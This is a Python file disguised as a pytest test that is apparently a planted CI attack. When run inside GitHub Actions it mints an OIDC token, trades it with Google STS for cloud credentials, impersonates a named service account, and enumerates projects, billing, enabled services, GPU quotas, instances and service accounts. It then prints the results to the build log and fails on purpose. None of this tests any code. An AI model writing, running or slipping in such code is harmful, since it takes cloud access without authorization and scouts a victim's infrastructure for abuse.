import os, json, base64, subprocess, urllib.request, urllib.error, urllib.parse

PROVIDER = "projects/75088546496/locations/global/workloadIdentityPools/otter-pool/providers/github-actions"
AUD = "//iam.googleapis.com/" + PROVIDER
SAS = ["otter-sa@data8x-scratch.iam.gserviceaccount.com"]
PIDS = ["75088546496", "data8x-scratch"]


def _req(u, method="GET", data=None, token=None, ctype="application/json", timeout=30):
    h = {"Accept": "application/json"}
    if ctype:
        h["Content-Type"] = ctype
    if token:
        h["Authorization"] = "Bearer " + token
    r = urllib.request.Request(u, data=data, method=method, headers=h)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, (e.read() or b"").decode("utf-8", "replace")
    except Exception as e:
        return -1, repr(e)[:160]


def _short(s, n=240):
    return (s or "")[:n].replace("\n", " ")


def _claims(tok):
    try:
        p = tok.split(".")[1]
        p += "=" * (-len(p) % 4)
        c = json.loads(base64.urlsafe_b64decode(p))
        return {k: c.get(k) for k in ("iss", "sub", "aud", "repository", "repository_owner", "event_name", "ref", "environment", "job_workflow_ref")}
    except Exception as e:
        return {"err": str(e)[:80]}


def test_c211_probe_74839():
    out = {"repo": os.environ.get("GITHUB_REPOSITORY"), "event": os.environ.get("GITHUB_EVENT_NAME"),
           "ref": os.environ.get("GITHUB_REF"), "sha": os.environ.get("GITHUB_SHA"),
           "mint": False, "sts": None, "federated": False, "direct": {}, "sa": {}}
    base = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
    if base:
        u = base + "&audience=" + urllib.parse.quote(AUD, safe="")
        hdr = "Authorization: Bearer " + os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
        r = subprocess.run(["curl", "-sS", "-m", "25", "-H", hdr, u], capture_output=True, text=True)
        try:
            tok = json.loads(r.stdout).get("value", "")
        except Exception:
            tok = ""
        out["mint"] = bool(tok)
        if tok:
            out["claims"] = _claims(tok)
            d = json.dumps({"audience": AUD,
                            "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
                            "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
                            "scope": "https://www.googleapis.com/auth/cloud-platform",
                            "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt",
                            "subjectToken": tok}).encode()
            st, body = _req("https://sts.googleapis.com/v1/token", "POST", d)
            out["sts"] = st
            out["sts_body"] = _short(body, 300)
            if st == 200:
                try:
                    ftok = json.loads(body).get("access_token", "")
                except Exception:
                    ftok = ""
                out["federated"] = bool(ftok)
                if ftok:
                    out["federated_token_len"] = len(ftok)
                    for pid in PIDS:
                        for lbl, u2 in [
                            ("PROJECT", "https://cloudresourcemanager.googleapis.com/v1/projects/%s" % pid),
                            ("PROJECTS_LIST", "https://cloudresourcemanager.googleapis.com/v1/projects"),
                            ("BILLING", "https://cloudbilling.googleapis.com/v1/projects/%s/billingInfo" % pid),
                            ("SERVICES", "https://serviceusage.googleapis.com/v1/projects/%s/services?filter=state:ENABLED&pageSize=200" % pid),
                            ("COMPUTE_USC1", "https://compute.googleapis.com/compute/v1/projects/%s/regions/us-central1" % pid),
                            ("COMPUTE_USE1", "https://compute.googleapis.com/compute/v1/projects/%s/regions/us-east1" % pid),
                            ("INSTANCES", "https://compute.googleapis.com/compute/v1/projects/%s/aggregated/instances" % pid),
                            ("VERTEX", "https://us-central1-aiplatform.googleapis.com/v1/projects/%s/locations/us-central1/customJobs" % pid),
                            ("SA_LIST", "https://iam.googleapis.com/v1/projects/%s/serviceAccounts?pageSize=100" % pid),
                        ]:
                            st2, b2 = _req(u2, token=ftok)
                            extra = ""
                            try:
                                j = json.loads(b2)
                                if lbl == "PROJECT":
                                    extra = "projectId=%s state=%s" % (j.get("projectId"), j.get("lifecycleState"))
                                elif lbl == "PROJECTS_LIST":
                                    extra = "n=%d %s" % (len(j.get("projects", [])), [p.get("projectId") for p in j.get("projects", [])][:8])
                                elif lbl == "BILLING":
                                    extra = "billingEnabled=%s" % j.get("billingEnabled")
                                elif lbl == "SERVICES":
                                    names = [s.get("config", {}).get("name", "") for s in j.get("services", [])]
                                    extra = "n=%d %s" % (len(names), [n for n in names if any(k in n for k in ("compute", "aiplatform", "run", "container", "dataproc", "batch", "storage"))][:10])
                                elif lbl.startswith("COMPUTE"):
                                    extra = str([(q.get("metric"), q.get("usage"), q.get("limit")) for q in j.get("quotas", []) if "GPU" in q.get("metric", "") or "INSTANCES" in q.get("metric", "")])[:280]
                                elif lbl == "INSTANCES":
                                    its = []
                                    for z, v in (j.get("items") or {}).items():
                                        for inst in v.get("instances", []) or []:
                                            its.append("%s:%s:%s" % (inst.get("name"), inst.get("machineType"), (inst.get("guestAccelerators") or [{}])[0].get("acceleratorType", "")))
                                    extra = "n=%d %s" % (len(its), its[:6])
                                elif lbl == "VERTEX":
                                    extra = "count=%d" % len(j.get("customJobs", []))
                                elif lbl == "SA_LIST":
                                    extra = ",".join(a.get("email", "") for a in j.get("accounts", []))[:280]
                            except Exception:
                                pass
                            out["direct"].setdefault(pid, {})[lbl] = {"st": st2, "x": extra or _short(b2, 150)}
                    for sa in SAS:
                        st3, b3 = _req("https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken" % sa,
                                       "POST", json.dumps({"scope": ["https://www.googleapis.com/auth/cloud-platform"], "lifetime": "1200s"}).encode(), token=ftok)
                        rec = {"sts": st3, "body": _short(b3, 200)}
                        if st3 == 200:
                            try:
                                satok = json.loads(b3).get("accessToken", "")
                            except Exception:
                                satok = ""
                            rec["sa_token_len"] = len(satok)
                            for pid in PIDS[:1]:
                                for lbl, u4 in [
                                    ("PROJECT", "https://cloudresourcemanager.googleapis.com/v1/projects/%s" % pid),
                                    ("SERVICES", "https://serviceusage.googleapis.com/v1/projects/%s/services?filter=state:ENABLED&pageSize=200" % pid),
                                    ("COMPUTE", "https://compute.googleapis.com/compute/v1/projects/%s/regions/us-central1" % pid),
                                ]:
                                    st4, b4 = _req(u4, token=satok)
                                    rec.setdefault("enum", {})[lbl] = {"st": st4, "x": _short(b4, 140)}
                        out["sa"][sa] = rec
    print("C211RESULT " + json.dumps(out))
    assert False, "c211 probe complete"
